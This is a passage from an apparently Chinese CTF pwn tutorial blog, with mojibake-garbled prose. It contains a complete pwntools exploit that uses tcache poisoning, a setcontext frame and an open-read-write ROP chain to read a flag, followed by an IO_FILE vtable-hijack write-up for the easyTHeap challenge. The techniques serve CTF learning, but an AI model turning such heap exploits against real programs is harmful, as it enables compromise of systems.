class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./gun&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Action&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shoot</span>(<span class="params">times:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Shoot time: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(times).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Which one do you want to load?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Bullet price: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Bullet Name: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;arttnba3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">b&quot;arttnba3&quot;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    buy(<span class="number">0x500</span>, <span class="string">b&quot;arttnba3&quot;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">b&quot;arttnba3&quot;</span>) <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">1168</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap addr</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAA&#x27;</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;heap addr leak: &#x27;</span> + <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;heap base: &#x27;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake_frame on heap</span></span><br><span class="line">    fake_frame_addr = heap_base + <span class="number">0x310</span> + <span class="number">0x10</span></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    load(<span class="number">0</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x100</span>, <span class="built_in">bytes</span>(fake_frame))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning with fastbin double free</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    load(<span class="number">9</span>)</span><br><span class="line">    load(<span class="number">10</span>)</span><br><span class="line">    shoot(<span class="number">2</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 10</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        load(<span class="number">3</span> + i)</span><br><span class="line">    shoot(<span class="number">7</span>)</span><br><span class="line">    load(<span class="number">10</span>)</span><br><span class="line">    load(<span class="number">9</span>)</span><br><span class="line">    shoot(<span class="number">3</span>) <span class="comment"># double free in fastbin</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># clear the tcache</span></span><br><span class="line">    buy(<span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;./flag\x00&#x27;</span>) <span class="comment"># idx 10, which we use to store the flag</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 11, overlapping chunk with idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, p64(libc_base + <span class="number">0x154930</span>)) <span class="comment"># idx12, our fake chunk on __free_hook</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the setcontext with gadget chain</span></span><br><span class="line">    flag_addr = heap_base + <span class="number">0x570</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(fake_frame_addr)<span class="comment"># rdi + 8 for the rdx, we set it to the addr of the fake frame</span></span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x100</span>, payload) <span class="comment"># idx 13</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    load(<span class="number">13</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    p.sendline(orw)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯è·å¾—flag</p><p><img src="https://i.loli.net/2021/02/10/CNypQMasthTbzK9.png" alt="image.png"></p><blockquote><p>æœ‰å…³setcontext()çš„åˆ©ç”¨è§ï¼š<a href="http://blog.eonew.cn/archives/993">setcontext å‡½æ•°exploit - Exä¸ªäººåšå®¢</a></p></blockquote><blockquote><p>ä»¥åŠæ„é€ ropé“¾æ—¶é‡åˆ°äº†ä¸€ä¸ªç„å­¦é—®é¢˜â€¦ä½¿ç”¨libcä¸­çš„<code>pop rdx ; ret</code>çš„gadgetä¼šè§¦å‘Segmentation Faultï¼Œåªå¥½æ”¹ç”¨<code>pop rdx ; pop rbx ; ret</code>çš„gadgetæ¥æ›´æ”¹rdxå¯„å­˜å™¨çš„å€¼â€¦åŸå› ä¸æ˜â€¦</p></blockquote><h3 id="ä¸ƒã€IO-FILE"><a href="#ä¸ƒã€IO-FILE" class="headerlink" title="ä¸ƒã€IO_FILE"></a>ä¸ƒã€IO_FILE</h3><p>å¯¹äºFILEç»“æ„ä½“çš„åˆ©ç”¨ä¹Ÿæ˜¯CTFä¸­çš„å¤§çƒ­é—¨ä¹‹ä¸€ï¼Œé€šè¿‡ä¿®æ”¹FILEç»“æ„ä½“æˆ–æ˜¯åŠ«æŒvtableè¡¨ç­‰æ–¹å¼å¯ä»¥ä»¤æ”»å‡»è€…ååˆ†æ–¹ä¾¿åœ°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><p>å¯¹äºFILEç»“æ„ä½“çš„ç›¸å…³å®šä¹‰è§<a href="https://ctf-wiki.org/pwn/linux/io_file/introduction/">CTF WIKI</a></p><h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable hijack"></a>vtable hijack</h4><p>å¯¹äºæ¯ä¸€ä¸ªFILEç»“æ„ä½“ï¼Œå…¶éƒ½æœ‰ä¸€ä¸ªè™šå‡½æ•°è¡¨ï¼Œåœ¨é€šè¿‡FILEç»“æ„ä½“å®ç°å„ç§è¾“å…¥è¾“å‡ºåŠŸèƒ½æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶è¯¥è™šå‡½æ•°è¡¨ï¼Œå°±èƒ½é€šè¿‡FILEç»“æ„ä½“ç›¸å…³çš„å‡½æ•°è°ƒç”¨æµç¨‹æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ</p><h5 id="ä¾‹é¢˜ï¼š-V-amp-N2020-å…¬å¼€èµ›-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget"><a href="#ä¾‹é¢˜ï¼š-V-amp-N2020-å…¬å¼€èµ›-easyTHeap-Use-After-Free-tcache-hijact-tcache-poisoning-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget"></a>ä¾‹é¢˜ï¼š[V&amp;N2020 å…¬å¼€èµ›]easyTHeap - Use After Free + tcache hijact + tcache poisoning + one_gadget</h5><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œä¿æŠ¤å…¨å¼€</p><p><img src="https://i.loli.net/2021/01/25/3ApsgBYDW1kPvZq.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2021/01/25/VvSMXr1gkjswG8F.png" alt="image.png"></p><p>ç¨‹åºæœ¬èº«æœ‰ç€<strong>åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾</strong>å †å—çš„åŠŸèƒ½ï¼Œç®—æ˜¯åŠŸèƒ½æ¯”è¾ƒé½å…¨</p><p>ä½†æ˜¯ç¨‹åºæœ¬èº«é™åˆ¶äº†<strong>åªèƒ½åˆ†é…7æ¬¡å †å—ï¼Œåªèƒ½é‡Šæ”¾3æ¬¡å †å—</strong></p><p><img src="https://i.loli.net/2021/01/25/bh3nFx1AWiQLIpy.png" alt="image.png"></p><p>æ¼æ´ç‚¹åœ¨äºfreeåŠŸèƒ½ä¸­<strong>æ²¡æœ‰å°†å †å—æŒ‡é’ˆç½®NULLï¼Œå­˜åœ¨Use After Freeæ¼æ´</strong></p><p><img src="https://i.loli.net/2021/01/25/qnHTGlJfv78uzCU.png" alt="image.png"></p><p>è™½ç„¶è¯´åœ¨åˆ†é…å †å—çš„åŠŸèƒ½ä¸­å¹¶æ²¡æœ‰è¿‡äºé™åˆ¶å¤§å°ï¼ˆ0x100ï¼‰ï¼Œä½†æ˜¯é¢˜ç›®æ‰€ç»™çš„libcæ˜¯æœ‰ç€tcacheçš„2.27ç‰ˆæœ¬ï¼Œéœ€è¦é€šè¿‡unsorted binæ³„éœ²main_arenaçš„åœ°å€æˆ‘ä»¬è‡³å°‘éœ€è¦é‡Šæ”¾8æ¬¡å †å—æ‰èƒ½è·å¾—ä¸€ä¸ªunsorted chunkï¼Œè€Œæˆ‘ä»¬ä»…è¢«å…è®¸é‡Šæ”¾3æ¬¡å †å—</p><p>ä½†æ˜¯åˆ©ç”¨use after freeæˆ‘ä»¬æ˜¯å¯ä»¥æ³„éœ²å †åŸºå€çš„ï¼Œè€Œ<strong>ç”¨ä»¥ç®¡ç†tcacheçš„tcache_perthread_structç»“æ„ä½“æœ¬èº«ä¾¿æ˜¯ç”±ä¸€ä¸ªchunkå®ç°çš„</strong></p><blockquote><p>ä»¥ä¸‹ä»£ç æ¥è‡ªglibc2.27</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">mstate ar_ptr;</span><br><span class="line"><span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line"> <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arena_get (ar_ptr, bytes);</span><br><span class="line">victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">   victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºtcacheç»“æ„æœ¬èº«ä¾¿æ˜¯é€šè¿‡ä¸€ä¸ªchunkæ¥å®ç°çš„</p></blockquote><p>libc2.27ä¸­æ²¡æœ‰å¯¹tcache double freeçš„æ£€æŸ¥ï¼Œæ•…åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡tcache double freeç»“åˆuse after freeæ³„æ¼å‡ºå †åŸºå€åä¼ªé€ ä¸€ä¸ªä½äºtcache_perthread_structç»“æ„ä½“é™„è¿‘çš„fake chunkä»¥åŠ«æŒtcache_perthread_structç»“æ„ä½“ä¿®æ”¹tcache_perthread_struct-&gt;countsä¸­å¯¹åº”indexçš„å€¼ä¸º7åé‡Šæ”¾chunkä¾¿å¯ä»¥è·å¾—unsorted binä»¥æ³„éœ²libcåŸºå€</strong></p><p>æƒ¯ä¾‹çš„pwndbgåŠ¨æ€è°ƒè¯•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°tcacheç»“æ„ä½“çš„sizeï¼Œä¹Ÿå°±å¾—åˆ°äº†åç§»</p><p><img src="https://i.loli.net/2021/01/25/ceBImgTw97HbUxh.png" alt="image.png"></p><blockquote><p>libc2.31ä¸‹è¿™ä¸ªsizeä¸º0x291ï¼Œä¸è¦åƒæˆ‘ä¸€æ ·çŠ¯äº†è°ƒé”™libcçš„é”™è¯¯âŒ</p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨freeåŠŸèƒ½ä¸­ä¼šå°†å…¶ä¿å­˜çš„chunk sizeç½®0ï¼Œ å› è€Œæˆ‘ä»¬éœ€è¦<strong>é‡æ–°å°†è¿™ä¸ªchunkç”³è¯·å›æ¥åæ‰èƒ½ç»§ç»­ç¼–è¾‘</strong></p><blockquote><p>èœé¸¡a3ã®è¸©å‘ç‚¹ * 1</p></blockquote><p>è¿™é“é¢˜æœ€ç»å…¸çš„åšæ³•å°±æ˜¯å¥—æ¿å­ï¼ŒåŠ«æŒ__malloc_hookä¸ºone_gadgetä»¥get shell</p><p>ä½†æ˜¯é™¤äº†åŠ«æŒ__malloc_hookä¸ºone_gadgetä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åŠ«æŒ_IO_2_1_stdout_ä¸­çš„vtableè¡¨çš„æ–¹å¼è°ƒç”¨one_gadget</p><p>è§‚å¯Ÿåˆ°ç¨‹åºä¸­åœ¨æˆ‘ä»¬editä¹‹åä¼šè°ƒç”¨puts()å‡½æ•°</p><p><img src="https://i.loli.net/2021/01/28/NlbrxUYMTpaohFj.png" alt="image.png"></p><p>puts()å‡½æ•°å®šä¹‰äºlibio&#x2F;ioputs.cä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  <span class="type">size_t</span> len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">weak_alias (_IO_puts, <span class="built_in">puts</span>)</span><br><span class="line">libc_hidden_def (_IO_puts)</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°å…¶ä¼šä½¿ç”¨å®<code>_IO_sputn</code>ï¼Œè¯¥å®å®šä¹‰äºlibio&#x2F;libioP.cä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure><p>å¥—å¨ƒå®ï¼Œè·Ÿè¿›ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_OFFSET 0</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br></pre></td></tr></table></figure><p>å³<strong>putså‡½æ•°æœ€ç»ˆä¼šè°ƒç”¨vtableè¡¨ä¸­çš„</strong><code>__xsputn</code><strong>å‡½æ•°æŒ‡é’ˆ</strong>ï¼Œgdbè°ƒè¯•æˆ‘ä»¬å¯ä»¥çŸ¥é“å…¶ç›¸å¯¹è¡¨å¤´åç§»åº”å½“ä¸º<code>0x30</code>ï¼ˆ64ä½ä¸‹ï¼‰</p><p><img src="https://i.loli.net/2021/01/28/nDQR7vLuyY92sK6.png" alt="image.png"></p><p>ç”±äº<strong>è‡ªlibc2.24å§‹å¢åŠ äº†å¯¹vtableè¡¨çš„åˆæ³•æ€§æ£€æµ‹ï¼Œæ•…æˆ‘ä»¬åªèƒ½æ‰§è¡Œä½äºåˆæ³•vtableè¡¨èŒƒå›´å†…çš„å‡½æ•°æŒ‡é’ˆ</strong></p><p>è€ƒè™‘åˆ°<strong>_IO_str_finishå‡½æ•°ä¼šå°†FILEæŒ‡é’ˆ + 0xE8çš„ä½ç½®ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</strong>ï¼Œæ•…æˆ‘ä»¬é€‰æ‹©ä¿®æ”¹_IO_2_1_stdout_çš„vtableè¡¨è‡³ç‰¹å®šä½ç½®ä»¥<strong>è°ƒç”¨_IO_str_finishå‡½æ•°</strong></p><p>è¡¨_IO_str_jumpsä¸­å­˜åœ¨ç€æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„_IO_str_finishå‡½æ•°çš„æŒ‡é’ˆï¼Œä¸”è¯¥è¡¨æ˜¯ä¸€ä¸ªåˆæ³•vtableè¡¨ï¼Œæ•…åªè¦æˆ‘ä»¬<strong>å°†stdoutçš„vtableè¡¨åŠ«æŒåˆ°_IO_str_finishé™„è¿‘å³å¯æˆåŠŸè°ƒç”¨_IO_str_finishå‡½æ•°</strong></p><p><img src="https://i.loli.net/2021/01/28/8za9eybLr15CQdn.png" alt="image.png"></p><p>ç”±_IO_jump_tç»“æ„ä½“çš„ç»“æ„æˆ‘ä»¬ä¸éš¾è®¡ç®—å‡ºfake vtableçš„ä½ç½®åº”å½“ä¸º<strong>_IO_str_jumps - 0x28</strong></p><p>åŠ«æŒvtableè¡¨ååœ¨_IO_2_1_stdout_ + 0xE8çš„ä½ç½®æ”¾ä¸Šone_gadgetï¼Œå³å¯åœ¨ç¨‹åºè°ƒç”¨putså‡½æ•°æ—¶get shell</p><p>é€šè¿‡gdbè°ƒè¯•å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½åœ°æ„é€ fake _IO_2_1_stdout_ç»“æ„ä½“</p><p><img src="https://i.loli.net/2021/01/28/1UL7f9tYpJvDQun.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/01/28/jJmV5HoTubeZGc9.png" alt="image.png"></p><p>éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯æœ‰å°‘éƒ¨åˆ†ç¬¦å·æ— æ³•ç›´æ¥é€šè¿‡symå­—å…¸è·å¾—ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé‡‡ç”¨å…¶ç›¸å¯¹åç§»ä»¥è®¡ç®—å…¶çœŸå®åœ°å€ï¼Œè¯¦è§æ³¨é‡Š</p><p><img src="https://i.loli.net/2021/01/28/2VYftpBeUyLrFa6.png" alt="image.png"></p><p>æ•…æœ€åæ„é€ çš„expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 